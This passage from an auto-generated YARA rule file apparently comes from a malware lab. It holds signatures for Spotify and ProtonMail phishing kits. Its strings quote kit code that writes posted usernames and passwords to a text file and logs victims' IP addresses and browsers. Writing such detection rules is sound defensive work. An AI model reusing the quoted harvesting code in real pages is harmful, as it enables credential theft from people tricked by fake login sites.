      $x1 = "    </script><div class=\"rc-anchor rc-anchor-invisible rc-anchor-light  rc-anchor-invisible-hover\"><div id=\"recaptcha-accessi" ascii /* score: '37.00'*/
      $x2 = "dden=\"true\" role=\"presentation\"> - </span><a href=\"https://www.google.com/intl/en/policies/terms/\" target=\"_blank\">Terms" ascii /* score: '35.00'*/
      $x3 = "- </span><a href=\"https://www.google.com/intl/en/policies/terms/\" target=\"_blank\">Terms</a></div></div></div></body></html>" fullword ascii /* score: '31.00'*/
      $s4 = "      recaptcha.anchor.Main.init(\"[\\x22ainput\\x22,[\\x22bgdata\\x22,\\x22Ly93d3cuZ29vZ2xlLmNvbS9qcy9iZy9oVnBLTHM5azc4N3h3SEFo" ascii /* score: '27.00'*/
      $s5 = "ref=\"https://www.google.com/intl/en/policies/privacy/\" target=\"_blank\">Privacy</a><span aria-hidden=\"true\" role=\"presenta" ascii /* score: '27.00'*/
      $s6 = "Z0dCWVVIWlg0Wk04NWRpbFAremZLN080VjlodGRnR0did2VMOEZLYmp5Mm9yb1Q2WDU3V2YrT2RlOGhTQ29uQVFBY0U5SzdLUzgrbzhUNDNDVGMrOHR0akpaTFkzdkw0" ascii /* base64 encoded string 'gGBYUHZX4ZM85dilP+zfK7O4V9htdgGGbweL8FKbjy2oroT6X57Wf+Ode8hSConAQAcE9K7KS8+o8T43CTc+8ttjJZLY3vL4' */ /* score: '26.00'*/
      $s7 = "WVkyN2NCQzUvdm1wZVp0c0V3MkNJbThxNmFieUJhVTFmcmUweUZCVG1mSUg5TDREUTd0Wm5oY283SXFrL20vakhoUlc0MkpSMnNVUnpWMitWMzFOV3JFeG5Td0YyMTgy" ascii /* base64 encoded string 'YY27cBC5/vmpeZtsEw2CIm8q6abyBaU1fre0yFBTmfIH9L4DQ7tZnhco7Iqk/m/jHhRW42JR2sURzV2+V31NWrExnSwF2182' */ /* score: '26.00'*/
      $s8 = "emx0UlIydXE0Z1dBcmpzYUViMW1UNXgwV3NvTWpReS94Rmg1d09meTFrdjZzQzVpeGs3cTRFRGRUNk1ENFVBcnZYeXFNbDNxdEZBZ2VHbjlOYUhZMDcreEFpWWdjUnoy" ascii /* base64 encoded string 'zltRR2uq4gWArjsaEb1mT5x0WsoMjQy/xFh5wOfy1kv6sC5ixk7q4EDdT6MD4UArvXyqMl3qtFAgeGn9NaHY07+xAiYgcRz2' */ /* score: '24.00'*/
      $s9 = "dVNWRzJDejBIUUwvMzZ0N2crOENnQkEySDhzUk9mV2toYWZScDRHaEJlcXc2QTFWbXhtcUd0aFZmM3lXRHhGK1VWZkVuNFppaVRuai8yR1BGNGd0Z09kQWxqcUI5U2l0" ascii /* base64 encoded string 'uSVG2Cz0HQL/36t7g+8CgBA2H8sROfWkhafRp4GhBeqw6A1VmxmqGthVf3yWDxF+UVfEn4ZiiTnj/2GPF4gtgOdAljqB9Sit' */ /* score: '24.00'*/
      $s10 = "cE85OUFnRS8wcmdZZ2poaW9OdldzZlA3Rm5JK3lXQjRVUWlSQkQ0d1A5bHF2cjJnRDBkMWZ3SzBKdFRKd0RtWGt6VHVTN1RodHd3a2ZEYjZlbTRkc2tFdmVIVVBXRStr" ascii /* base64 encoded string 'pO99AgE/0rgYgjhioNvWsfP7FnI+yWB4UQiRBD4wP9lqvr2gD0d1fwK0JtTJwDmXkzTuS7ThtwwkfDb6em4dskEveHUPWE+k' */ /* score: '24.00'*/
      $s11 = "iv><div class=\"rc-anchor-pt\"><a href=\"https://www.google.com/intl/en/policies/privacy/\" target=\"_blank\">Privacy</a><span a" ascii /* score: '23.00'*/
      $s12 = "bTJSb1FiVnM2VVcyMlZQdVlpMDAwdjVYL0xNV2lncE1BanA5dHdDMFhzTmdkeVMvYXkvMXMxUWdJajRRQVhCNkRxRjdPSUxCRXBZR1JzZThEY1lFdUoyZ2F6bGt4NUV4" ascii /* base64 encoded string 'm2RoQbVs6UW22VPuYi000v5X/LMWigpMAjp9twC0XsNgdyS/ay/1s1QgIj4QAXB6DqF7OILBEpYGRse8DcYEuJ2gazlkx5Ex' */ /* score: '21.00'*/
      $s13 = "blFsU1lNZ1V5V05HZ0U1ZmVyN0lPR1dMYmU4ZmIvNkIyUTc3VkNyVktaVkFWR2g4S2ErWVBCRkVZa05hekJoWGVTbDZRSFFkMkczQktlU1c1SmVwenZkbzNjN0NWTXo0" ascii /* base64 encoded string 'nQlSYMgUyWNGgE5fer7IOGWLbe8fb/6B2Q77VCrVKZVAVGh8Ka+YPBFEYkNazBhXeSl6QHQd2G3BKeSW5Jepzvdo3c7CVMz4' */ /* score: '21.00'*/
      $s14 = "dzlMQ1ZTUW5xS29PdTNvWjljQzZWekYvMkxaSWx2bnJYQVhjTEdYdFlvY0psVWQ3bjBERGtQRGhmdzNtUlh4WExvSXk1NDd5dzAxclRVblp6b1RRbDZraWE5NWJBRy9v" ascii /* base64 encoded string 'w9LCVSQnqKoOu3oZ9cC6VzF/2LZIlvnrXAXcLGXtYocJlUd7n0DDkPDhfw3mRXxXLoIy547yw01rTUnZzoTQl6kia95bAG/o' */ /* score: '21.00'*/
      $s15 = "N3VtY0g3Rk9jSjBpTDdqbWFPYURBY1VyckVRT29SeElVMzBBbXNGWU9vaDhZN2RNeTJMZ0VZQTZ2UVE5dXBkM29SRjdEdG9HWTVHN2NrZi9BVDhRYmpSWm1wMG9JeWNj" ascii /* base64 encoded string '7umcH7FOcJ0iL7jmaOaDAcUrrEQOoRxIU30AmsFYOoh8Y7dMy2LgEYA6vQQ9upd3oRF7DtoGY5G7ckf/AT8QbjRZmp0oIycc' */ /* score: '21.00'*/
      $s16 = "cStXcUtDSEJ4cisvb2NyK3N0bkJKbFZnQjcwOEdBejdMWllmaktWbld2Wmx2TlpKVUMvcnJDRkdmL1dRc2hPcGZWUG1mYnV2MFp2Qk5UWjFkWmpSWnY2d2ZHK2tkWk1o" ascii /* base64 encoded string 'q+WqKCHBxr+/ocr+stnBJlVgB708GAz7LZYfjKVnWvZlvNZJUC/rrCFGf/WQshOpfVPmfbuv0ZvBNTZ1dZjRZv6wfG+kdZMh' */ /* score: '21.00'*/
      $s17 = "RkRxbWhwbFhtQW81cUVWbEJrT3FxSXB3QlUyREJDSHBYZUJJblV3bmVtTVVha3pZQ0g4NWZIYXhFSDcrcU92VFNRQWxKc3poQWFOK0xrd2JQRXdYSGN2VWlwQWVXQ1R0" ascii /* base64 encoded string 'FDqmhplXmAo5qEVlBkOqqIpwBU2DBCHpXeBInUwnemMUakzYCH85fHaxEH7+qOvTSQAlJszhAaN+LkwbPEwXHcvUipAeWCTt' */ /* score: '21.00'*/
      $s18 = "OWRKaDYzRmxleGFYUXdsY2VkbnRVbW1yLzk5Z2JvRHVTUEgzLzhsTjVzZ0pmQitKWHFsOTl1OFl2VTVZZ0NmSmN1Z3FIcG1RYmxoaXVXeGp2N0NLcEhOeHMvQkRGZUxh" ascii /* base64 encoded string '9dJh63FlexaXQwlcedntUmmr/99gboDuSPH3/8lN5sgJfB+JXql99u8YvU5YgCfJcugqHpmQblhiuWxjv7CKpHNxs/BDFeLa' */ /* score: '21.00'*/
      $s19 = "bVU2RCtQQUFhTnREZ3VDQWRST3NzaFJoejRsY1dXa25LNEVvSEYvQXNjUGhkUUVkd04zczFkblVJRGJBZWdyREt3Ym9BK3g0RXJLQzdjclE5TjU0eFB6TTE4cGxzTUM4" ascii /* base64 encoded string 'mU6D+PAAaNtDguCAdROsshRhz4lcWWknK4EoHF/AscPhdQEdwN3s1dnUIDbAegrDKwboA+x4ErKC7crQ9N54xPzM18plsMC8' */ /* score: '21.00'*/
      $s20 = "UEtYVkdLallhbjNMdjBzM29ZTUE1eUdEeGF5WHU2N3BBWkVuc1BvMmNPNnovcCsvMllGQlVtSWdSRVlqS2o2MzBhRGNRV3R3UUMwbFZlN2FBWVdCMUcySnBmRmh6cnNK" ascii /* base64 encoded string 'PKXVGKjYan3Lv0s3oYMA5yGDxayXu67pAZEnsPo2cO6z/p+/2YFBUmIgREYjKj630aDcQWtwQC0lVe7aAYWB1G2JpfFhzrsJ' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule analytics {
   meta:
      description = "phish__spotify - file analytics.js"
      author = "Comps Team Malware Lab"
      reference = "phish__spotify phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "3fab1c883847e4b5a02f3749a9f4d9eab15cd4765873d3b2904a1a4c8755fba3"
   strings:
      $x1 = "if(!e)return!1;var g=new e;if(!(\"withCredentials\"in g))return!1;a=a.replace(/^http:/,\"https:\");g.open(\"POST\",a,!0);g.withC" ascii /* score: '34.00'*/
      $x2 = "3E4),c=\"\");return Pc(c,b)?(Ub.push(a),!0):!1},Pc=function(a,b,c){if(!window.JSON)return J(58),!1;var d=O.XMLHttpRequest;if(!d)" ascii /* score: '33.00'*/
      $x3 = "(\"https:\"==a||a==c||(\"http:\"!=a?0:\"http:\"==c))&&B(d)&&(wa(d.url,void 0,e),$d.set(b,!0)))}},v=function(a,b){var c=A.get(a)|" ascii /* score: '32.00'*/
      $x4 = "for(d=0;d<a.length;d++)if(b==a[d]){d=!0;break a}d=!1}return d},Cc=function(a){return encodeURIComponent?encodeURIComponent(a).re" ascii /* score: '31.00'*/
      $s5 = "N.N=function(){\"ga\"!=gb&&J(49);var a=O[gb];if(!a||42!=a.answer){N.L=a&&a.l;N.loaded=!0;var b=O[gb]=N;X(\"create\",b,b.create);" ascii /* score: '30.00'*/
      $s6 = "rd(e,b)}})};function sd(a,b){if(b==M.location.hostname)return!1;for(var c=0;c<a.length;c++)if(a[c]instanceof RegExp){if(a[c].tes" ascii /* score: '28.00'*/
      $s7 = "Dc.prototype.S=function(a,b,c){function d(c){try{c=c||O.event;a:{var d=c.target||c.srcElement;for(c=100;d&&0<c;){if(d.href&&d.no" ascii /* score: '27.00'*/
      $s8 = "\"\"==a||\":\"==a)return!0;return!1},ya=function(a,b){var c=M.referrer;if(/^(https?|android-app):\\/\\//i.test(c)){if(a)return c" ascii /* score: '27.00'*/
      $s9 = "String(a.get(Q)),d.ka=Number(a.get(n)),c=c.palindrome?r:q,c=(c=M.cookie.replace(/^|(; +)/g,\";\").match(c))?c.sort().join(\"\")." ascii /* score: '27.00'*/
      $s10 = "turn J(59),!1;var e=new d;if(!(\"withCredentials\"in e))return J(60),!1;e.open(\"POST\",(c||\"https://ampcid.google.com/v1/publi" ascii /* score: '27.00'*/
      $s11 = " c=\"https://www.google-analytics.com/gtm/js?id=\"+K(a.id);\"dataLayer\"!=a.B&&b(\"l\",a.B);b(\"t\",a.target);b(\"cid\",a.client" ascii /* score: '27.00'*/
      $s12 = "(a=[\"t=error\",\"_e=\"+a,\"_v=j68\",\"sr=1\"],b&&a.push(\"_f=\"+b),c&&a.push(\"_m=\"+K(c.substring(0,100))),a.push(\"aip=1\"),a" ascii /* score: '24.00'*/
      $s13 = "c.type=\"text/javascript\",c.async=!0,c.src=a,b&&(c.id=b),a=M.getElementsByTagName(\"script\")[0],a.parentNode.insertBefore(c,a)" ascii /* score: '24.00'*/
      $s14 = "pc.prototype.ma=function(a,b){var c=this;u(a,c,b)||(v(a,function(){u(a,c,b)}),y(String(c.get(V)),a,void 0,b,!0))};var rc=functio" ascii /* score: '23.00'*/
      $s15 = "b){Za.push([new RegExp(\"^\"+a+\"$\"),b])},T=function(a,b,c){return S(a,b,c,void 0,db)},db=function(){};var gb=qa(window.GoogleA" ascii /* score: '23.00'*/
      $s16 = "l?\"https:\":\"http:\")+\"//www.google-analytics.com\"},Da=function(a){this.name=\"len\";this.message=a+\"-8192\"},ba=function(a" ascii /* score: '23.00'*/
      $s17 = "if(!e)return!1;var g=new e;if(!(\"withCredentials\"in g))return!1;a=a.replace(/^http:/,\"https:\");g.open(\"POST\",a,!0);g.withC" ascii /* score: '23.00'*/
      $s18 = "cation.protocol?\"https:\":\"http:\")+\"//www.google-analytics.com/plugins/ua/\"+c),d=ae(c),a=d.protocol,c=M.location.protocol," fullword ascii /* score: '22.00'*/
      $s19 = "encodeURIComponent(a),\"/\",e,\"\",b)){fb=e;return}}}zc(\"AMP_TOKEN\",encodeURIComponent(a),\"/\",fb,\"\",b)},Qc=function(a,b,c)" ascii /* score: '22.00'*/
      $s20 = "(\"https:\"==a||a==c||(\"http:\"!=a?0:\"http:\"==c))&&B(d)&&(wa(d.url,void 0,e),$d.set(b,!0)))}},v=function(a,b){var c=A.get(a)|" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__spotify_home_ubuntu_malware_lab_samples_extracted_phishing_Spotify_index_files_index_2 {
   meta:
      description = "phish__spotify - file index.js"
      author = "Comps Team Malware Lab"
      reference = "phish__spotify phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d86af73b2f46ac79673ad6e42baf6c3c90445353d3022b4088592102c392ff10"
   strings:
      $x1 = "&quot;\" sp-disallow-chars-model=usernameDisallowedChars autocapitalize=off autocomplete=off autocorrect=off autofocus=autofocus" ascii /* score: '81.00'*/
      $x2 = "\";else{(function(e,t,n,r){var a=e.d,i=a.length-e.i,o=(t=_(t)?Math.min(Math.max(n,i),r):+t)+e.i,s=a[o];if(o>0)a.splice(o);else{e" ascii /* score: '80.00'*/
      $x3 = "\"===e},isIdent:function(e){return\"a\"<=e&&e<=\"z\"||\"A\"<=e&&e<=\"Z\"||\"_\"===e||\"$\"===e},isExpOperator:function(e){return" ascii /* score: '73.00'*/
      $x4 = "profile!\",alreadyOnSpotify:\"Already on Spotify?\",signUpForFree:\"Sign up for free\",goToAppStore:\"Go to App Store\",\"scope-" ascii /* score: '72.00'*/
      $x5 = "</span><span class=sr-only>Close</span></button> <span ng-bind-html=\"\\'notificationCookiePolicy\\' | localize:cookiePolicyURL" ascii /* score: '72.00'*/
      $x6 = "profile!\",alreadyOnSpotify:\"Already on Spotify?\",signUpForFree:\"Sign up for free\",goToAppStore:\"Go to App Store\",\"scope-" ascii /* score: '67.00'*/
      $x7 = "n de tu cuenta de Spotify\"}},function(e){e.exports={smartling:{translate_paths:{path:\"/*\",key:\"/{*}\"},variants_enabled:\"tr" ascii /* score: '64.00'*/
      $x8 = ".',youAreLoggedInAsUsername:\"Je bent ingelogd als {0}.\",errorTitle:\"Fout\",error404Title:\"Fout 404 - Niet gevonden\",error40" ascii /* score: '56.00'*/
      $x9 = "!function(e){var t={};function n(r){if(t[r])return t[r].exports;var a=t[r]={i:r,l:!1,exports:{}};return e[r].call(a.exports,a,a." ascii /* score: '55.00'*/
      $x10 = "t ein, um es mit deinem Spotify Konto zu verbinden.\",helpMessageGeneral:'Wenn Du noch immer Hilfe brauchst, wende Dich an den <" ascii /* score: '52.00'*/
      $x11 = " responsabile dell\\'uso delle tue informazioni secondo quanto riportato nella propria informativa sulla privacy e che queste po" ascii /* score: '51.00'*/
      $x12 = " tardi o consulta <a href=\"https://www.spotify.com/help\" target=\"_blank\">l\\'area di assistenza</a>',errorInvalidCredentials" ascii /* score: '49.00'*/
      $x13 = "essayez ou consultez notre <a href=\"https://www.spotify.com/help\" target=\"_blank\">rubrique d\\'aide</a>.',errorInvalidCreden" ascii /* score: '44.00'*/
      $x14 = " votre compte Spotify.\",helpMessageGeneral:'Si vous avez toujours besoin d\\'aide, contactez <a href=\"https://support.spotify." ascii /* score: '44.00'*/
      $x15 = ".com/\" target=\"_blank\">Spotify Support.</a>',inputUsername:\"E-mailadres of gebruikersnaam\",inputPassword:\"Wachtwoord\",che" ascii /* score: '41.00'*/
      $x16 = "profile!\",alreadyOnSpotify:\"Already on Spotify?\",signUpForFree:\"Sign up for free\",goToAppStore:\"Go to App Store\",\"scope-" ascii /* score: '40.00'*/
      $x17 = " gebruiken cookies om je onze diensten te leveren en je advertenties te tonen die zijn gebaseerd op je interesses. Door onze web" ascii /* score: '40.00'*/
      $x18 = "ih memerlukan bantuan, hubungi <a href=\"https://support.spotify.com/\" target=\"_blank\">Dukungan Spotify</a>',inputUsername:\"" ascii /* score: '39.00'*/
      $x19 = "lp kontaktar du <a href=\"https://support.spotify.com/\" target=\"_blank\">Spotifys support</a>',inputUsername:\"E-postadress el" ascii /* score: '39.00'*/
      $x20 = "n necesitas ayuda, ponte en contacto con el <a href=\"https://support.spotify.com/\" target=\"_blank\">Soporte de Spotify</a>',i" ascii /* score: '39.00'*/
   condition:
      uint16(0) == 0x6621 and filesize < 1000KB and
      1 of ($x*)
}

rule _opt_mal_phish__spotify_home_ubuntu_malware_lab_samples_extracted_phishing_Spotify_index {
   meta:
      description = "phish__spotify - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__spotify phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__spotify_home_ubuntu_malware_lab_samples_extracted_phishing_Spotify_login_2 {
   meta:
      description = "phish__spotify - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__spotify phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5a6f20e962d31fadabcc7fb3f35733703fb28951a5acbe9957d99d38716a5801"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['username'] . \" Pass: \" . $_POST['password'] . \"\\n\", FILE_APPEN" ascii /* score: '29.00'*/
      $s2 = "header('Location: https://accounts.spotify.com/');" fullword ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__spotify_home_ubuntu_malware_lab_samples_extracted_phishing_Spotify_ip {
   meta:
      description = "phish__spotify - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__spotify phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "b4cca83eb16c721d752117de2d7c60d83f2c643299e4c3c4f9bad3fdfac3affb"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s4 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s8 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__protonmail/phish__protonmail_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__protonmail
   Reference: phish__protonmail phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__protonmail_home_ubuntu_malware_lab_samples_extracted_phishing_ProtonMail_index_files_openpgp {
   meta:
      description = "phish__protonmail - file openpgp.js"
      author = "Comps Team Malware Lab"
      reference = "phish__protonmail phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "13a10ffca8099758903b4ff42f7ebe5333497302982ee98f4896b766631dea68"
   strings:
      $x1 = "!function(e){if(\"object\"==typeof exports&&\"undefined\"!=typeof module)module.exports=e();else if(\"function\"==typeof define&" ascii /* score: '72.50'*/
      $x2 = "dump(t),console.log(e))},getLeftNBits:function(e,t){var r=t%8;if(0===r)return e.substring(0,t/8);var n=(t-r)/8+1,i=e.substring(0" ascii /* score: '31.00'*/
      $s3 = "Key=r.PublicKeyEncryptedSessionKey=r.SymEncryptedAEADProtected=r.SymEncryptedIntegrityProtected=r.Compressed=void 0;var s=e(\"./" ascii /* score: '30.00'*/
      $s4 = "\"+e[t]);l.default.debug&&!/^(Version|Comment|MessageID|Hash|Charset): .+$/.test(e[t])&&console.log(\"Unknown header: \"+e[t])}}" ascii /* score: '30.00'*/
      $s5 = "on i(){this.tag=u.default.packet.publicKeyEncryptedSessionKey,this.version=3,this.publicKeyId=new s.default,this.publicKeyAlgori" ascii /* score: '29.00'*/
      $s6 = "or encrypting message\"))},r.decrypt=function(e){var t=e.message,r=e.privateKey,n=e.publicKeys,i=e.sessionKey,s=e.password,o=e.f" ascii /* score: '28.00'*/
      $s7 = "PublicKeyEncryptedSessionKey;s.publicKeyId=n.getKeyId(),s.publicKeyAlgorithm=n.algorithm,s.sessionKey=e,s.sessionKeyAlgorithm=t," ascii /* score: '28.00'*/
      $s8 = ",n,i)}},\"Error encrypting session key\")},r.decryptSessionKey=function(e){var t=e.message,r=e.privateKey,n=e.password;return a(" ascii /* score: '28.00'*/
      $s9 = "rtext signed message\")},r.encryptSessionKey=function(e){var t=e.data,r=e.algorithm,n=e.publicKeys,i=e.passwords;return function" ascii /* score: '27.00'*/
      $s10 = "r))throw new Error(\"Invalid passphrase\");return{key:t}},\"Error decrypting private key\")},r.encrypt=function(e){var t=e.data," ascii /* score: '27.00'*/
      $s11 = ",print_debug:function(e){n.default.debug&&console.log(e)},print_debug_hexstr_dump:function(e,t){n.default.debug&&(e+=this.hexstr" ascii /* score: '26.00'*/
      $s12 = "ngth:t,publicExponent:l.subarray(0,3),hash:{name:\"SHA-1\"}},f=o.generateKey(u,!0,[\"encrypt\",\"decrypt\"])):(u={name:\"RSASSA-" ascii /* score: '26.00'*/
      $s13 = "ult.publicKey.rsa_encrypt_sign)throw new Error(\"Only RSA Encrypt or Sign supported\");if(!e.privateKey.decrypt())throw new Erro" ascii /* score: '26.00'*/
      $s14 = "t.read(l.default.symmetric,g.getPreferredSymAlgo(e));else{if(!t||!t.length)throw new Error(\"No keys, passwords, or session key " ascii /* score: '26.00'*/
      $s15 = "rypt=function(e){if(!this.isPrivate())throw new Error(\"Nothing to encrypt in a public key\");for(var t=this.getAllKeyPackets()," ascii /* score: '26.00'*/
      $s16 = "ault.print_debug(\"rsa.js decrypt\\nxpn:\"+s.default.hexstrdump(d.toMPI())+\"\\nxqn:\"+s.default.hexstrdump(p.toMPI()));var y=p." ascii /* score: '25.00'*/
      $s17 = "(e(\"./key.js\"));s.prototype.getEncryptionKeyIds=function(){var e=[];return this.packets.filterByTag(l.default.packet.publicKey" ascii /* score: '25.00'*/
      $s18 = "is.getEncryptionKeyIds();if(!a.length)return;var o=e.getKeyPacket(a);if(!o.isDecrypted)throw new Error(\"Private key is not decr" ascii /* score: '25.00'*/
      $s19 = "0-\\u200a\\u202f\\u205f\\u3000]*\\n/m.exec(e);if(null===n)throw new Error(\"Mandatory blank line missing between armor headers a" ascii /* score: '24.00'*/
      $s20 = "PublicKeyAlgorithm=e[n++],this.signatureTargetHashAlgorithm=e[n++];var c=f.default.getHashByteLength(this.signatureTargetHashAlg" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__protonmail_home_ubuntu_malware_lab_samples_extracted_phishing_ProtonMail_index_files_app {
   meta:
      description = "phish__protonmail - file app.js"
      author = "Comps Team Malware Lab"
      reference = "phish__protonmail phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "b8c3129156bb0158e04633174c761bf8cac2e497cf83716fea64339ded5a2dac"
   strings:
      $x1 = "s signature failed</p> <p><a href=https://protonmail.com/support/knowledge-base/encrypted-contacts/ target=_blank translate-cont" ascii /* score: '91.00'*/
      $x2 = "\",OPEN_TAG_AUTOCOMPLETE_RAW:\"<\",CLOSE_TAG_AUTOCOMPLETE_RAW:\">\"},t.AUTOCOMPLETE_DOMAINS=[\"protonmail.com\",\"protonmail.ch" ascii /* score: '83.00'*/
      $x3 = " 2018 Denis Pushkarev (zloirock.ru)\"})},\"./node_modules/core-js/library/modules/_species-constructor.js\":function(e,t,a){var " ascii /* score: '75.00'*/
      $x4 = "\",CHF:\"CHF\"};function a(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:0,a=arguments.length>1&&void 0!==argum" ascii /* score: '71.00'*/
      $x5 = "\"))])}var r={4:function(e,t,a){return r[3](e,t,a)},3:function(e,t,a){var s=pmcrypto.binaryStringToArray(t+\"proton\");return n(" ascii /* score: '71.00'*/
      $x6 = "t deleted if the folder is deleted, they can still be found in all mail. If you want to delete all messages in a folder, move th" ascii /* score: '70.00'*/
      $x7 = "\",key:\"uk_UA\"}],e.locale=(0,r.default)(e.locales,{key:g.getCurrentLanguage()})||e.locales[0];var L=(0,n.default)(e.emailing);" ascii /* score: '68.00'*/
      $x8 = " %chttps://protonmail.com/careers\",t,a,n)}}Object.defineProperty(t,\"__esModule\",{value:!0}),n.$inject=[\"$log\"],t.default=n}" ascii /* score: '68.00'*/
      $x9 = " {{ method.Details.Last4 }}</td> <td>{{ method.Details.ExpMonth }}/{{ method.Details.ExpYear }}</td> <td> <span class=pm_badge>{" ascii /* score: '66.00'*/
      $x10 = " \"+(void 0===e?\"\":e)}(void 0===n?{}:n),value:\"use.card\"}})}(l))),x=v[j]}return p&&(x=(0,s.default)(v,{value:p})),{list:v,se" ascii /* score: '60.00'*/
      $x11 = "\",zip:e.method.Details.ZIP,country:e.method.Details.Country}):(a.text=n.getString(\"Add a credit card.\",null,\"Credit card mod" ascii /* score: '55.00'*/
      $x12 = "!function(e){var t={};function a(n){if(t[n])return t[n].exports;var s=t[n]={i:n,l:!1,exports:{}};return e[n].call(s.exports,s,s." ascii /* score: '51.00'*/
      $x13 = "href=\"https://protonmail.com/support/knowledge-base/updating-your-login-password/\" target=\"_blank\">Click here to learn more<" ascii /* score: '41.00'*/
      $x14 = "ult.reject({error_description:\"Please login with just your ProtonMail username (without @protonmail.com or @protonmail.ch).\"})" ascii /* score: '40.00'*/
      $x15 = "ef=https://protonmail.com/support/knowledge-base/set-forgot-password-options/ target=_blank title=\"This is the optional email y" ascii /* score: '38.00'*/
      $x16 = "ef=https://old.protonmail.com/login target=_self translate-context=Action translate-comment=\"link for old\" translate>Having tr" ascii /* score: '38.00'*/
      $x17 = "f=https://protonmail.com/support target=_blank class=\"login-support pm_button link pull-left\" translate-context=Action transla" ascii /* score: '37.00'*/
      $x18 = "mmon login problems</a> </p> <p> <a href=https://protonmail.com/support target=_blank class=\"pm_button primary\" translate tran" ascii /* score: '37.00'*/
      $x19 = "l.com/bridge/ target=_blank translate-context=Link translate>Download bridge</a> </div>')}])}e.exports=n},\"./src/templates/brid" ascii /* score: '37.00'*/
      $x20 = "b),d.textContent=y}u.innerHTML=15225===g?h+'.<br /><a href=\"https://protonmail.com/support/knowledge-base/search/\" target=\"_b" ascii /* score: '35.00'*/
   condition:
      uint16(0) == 0x6621 and filesize < 3000KB and
      1 of ($x*)
}

rule _opt_mal_phish__protonmail_home_ubuntu_malware_lab_samples_extracted_phishing_ProtonMail_index_files_appLazy {
   meta:
      description = "phish__protonmail - file appLazy.js"
      author = "Comps Team Malware Lab"
      reference = "phish__protonmail phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "8d67b2ac2b4b8cc7d7b03fc67cb806b7b95b63aa75d88b41f55dd6577b5bf750"
   strings:
      $x1 = " 2018 Denis Pushkarev (zloirock.ru)\"})},\"./node_modules/core-js/library/modules/_species-constructor.js\":function(e,t,a){var " ascii /* score: '83.00'*/
      $x2 = "s signature failed</p> <p><a href=https://protonmail.com/support/knowledge-base/encrypted-contacts/ target=_blank translate-cont" ascii /* score: '81.00'*/
      $x3 = " \"+a.format(\"ll\")+\" \"+a.format(\"LT\")+\" \"+r},filterAttachmentsForEvents:function(){return(arguments.length>0&&void 0!==a" ascii /* score: '73.00'*/
      $x4 = "<br>\\n                \"+n.getString(\"On {{date}}, {{name}} {{address}} wrote:\",{date:e(\"localReadableTime\")(r.Time),name:r" ascii /* score: '72.00'*/
      $x5 = "\",OPEN_TAG_AUTOCOMPLETE_RAW:\"<\",CLOSE_TAG_AUTOCOMPLETE_RAW:\">\"},t.AUTOCOMPLETE_DOMAINS=[\"protonmail.com\",\"protonmail.ch" ascii /* score: '70.00'*/
      $x6 = "\").split(\";\").map(function(e){return e.replace(p,\"\\\\;\")}).map(v):v(e)}(e.valueOf(),t),type:function(e){var t=e.getType();" ascii /* score: '67.00'*/
      $x7 = "{\")}(p),color:u}))}return function(e,a){return(0,s.default)(a,t.MAILBOX_IDENTIFIERS[e])}(l,e)?n+d(i[l]):n},\"\")},getTemplateTy" ascii /* score: '65.00'*/
      $x8 = "\"]},function(e){return new RegExp(\"[\"+e.join(\"\")+\"]\",\"g\")});e.codeMirrorLoaded=function(e){(l=e).on(\"change\",function" ascii /* score: '65.00'*/
